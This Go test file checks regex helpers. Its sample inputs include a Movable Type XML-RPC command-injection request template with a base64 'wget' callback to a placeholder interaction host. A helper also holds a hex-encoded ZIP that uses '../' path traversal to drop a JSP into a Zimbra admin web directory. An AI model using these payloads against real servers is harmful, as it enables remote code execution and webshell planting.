package regex2

import (
	"encoding/hex"
	"fmt"
	"testing"
)

func TestRegexp2SimpleUse(t *testing.T) {
	body := "PHPSESSID=e5tmcecfhcru27rt28ih32tch5; path=/"
	regex := "PHPSESSID=.*?(?=;)"
	result, err := Regexp2SimpleUse(body, regex)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(result)
}

// 测试代码，临时使用
func otherTest() {
	b := func(args any) {
		switch a := args.(type) {
		case nil:
			fmt.Println("nil")
		case string:
			fmt.Println("string", a)
		case int:
			fmt.Println("int", a)
		}
	}
	b("fuck")

	src1 := []byte("504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000f00000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b05060000000002000200d6000000e00100000000")
	dest1 := make([]byte, hex.DecodedLen(len(src1)))
	hex.Decode(dest1, src1)
	fmt.Println(dest1)
}

func TestRegexp2SimpleReplace(t *testing.T) {
	otherTest()

	src := "  POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: text/xml\n\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        <methodCall>\n          <methodName>mt.handler_to_coderef</methodName>\n          <params>\n            <param>\n              <value>\n{{base64(\"`wget http://{{interactsh-url}}`\")}}\n                <base64>\n                  {{base64(\"`wget http://{{interactsh-url}}`\")}}\n                </base64>\n              </value>\n            </param>\n          </params>\n        </methodCall>"
	dest := "fuck"
	regex := "({{base64\\()([\\w\\W]+?)(\\)}})"
	result, err := Regexp2SimpleReplace(src, dest, regex)
	fmt.Println(result, err)

}
